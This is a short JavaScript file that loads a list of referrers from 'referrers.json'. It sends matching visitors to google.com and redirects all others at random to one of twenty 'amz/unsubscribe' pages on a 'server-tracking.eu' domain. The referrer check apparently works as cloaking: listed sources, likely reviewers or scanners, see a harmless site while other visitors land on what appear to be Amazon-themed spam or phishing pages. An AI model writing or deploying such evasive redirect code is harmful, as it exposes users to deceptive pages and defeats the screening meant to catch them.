// Static redirect URL for all referrers
const staticRedirectUrl = "https://www.google.com";

// List of URLs
const urls = [
    "https://server-tracking.eu/amz/unsubscribe-012024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-012024-02.html",
    "https://server-tracking.eu/amz/unsubscribe-012024-03.html",
    "https://server-tracking.eu/amz/unsubscribe-012024-04.html",
    "https://server-tracking.eu/amz/unsubscribe-022024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-032024-02.html",
    "https://server-tracking.eu/amz/unsubscribe-032024-03.html",
    "https://server-tracking.eu/amz/unsubscribe-032024-04.html",
    "https://server-tracking.eu/amz/unsubscribe-032024-05.html",
    "https://server-tracking.eu/amz/unsubscribe-032024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-042024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-042024-02.html",
    "https://server-tracking.eu/amz/unsubscribe-042024-03.html",
    "https://server-tracking.eu/amz/unsubscribe-042024-04.html",
    "https://server-tracking.eu/amz/unsubscribe-052024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-052024-02.html",
    "https://server-tracking.eu/amz/unsubscribe-062024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-072024-01.html",
    "https://server-tracking.eu/amz/unsubscribe-122023-01.html",
    "https://server-tracking.eu/amz/unsubscribe-112024-01.html"
];

// Function to handle redirection
function redirectToRandomUrl(referrers) {
    const referrer = document.referrer;

    // Check if the referrer is in the list
    if (referrers.includes(referrer)) {
        console.log(`Redirecting visitor from referrer ${referrer} to ${staticRedirectUrl}`);
        window.location.href = staticRedirectUrl;
        return;
    }

    // Redirect to a random URL if no referrer match
    if (!urls || urls.length === 0) {
        console.error("No URLs available for redirection.");
        return;
    }

    const randomIndex = Math.floor(Math.random() * urls.length);
    const randomUrl = urls[randomIndex];

    console.log(`Redirecting to: ${randomUrl}`);
    window.location.href = randomUrl;
}

// Load referrers from JSON file and execute redirection
fetch('referrers.json')
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        const referrers = data.referrers || [];
        console.log('Loaded referrers:', referrers);

        // Execute the redirection logic with loaded referrers
        redirectToRandomUrl(referrers);
    })
    .catch(error => {
        console.error('Error loading referrers:', error);

        // Fallback to random redirection if referrers fail to load
        redirectToRandomUrl([]);
    });
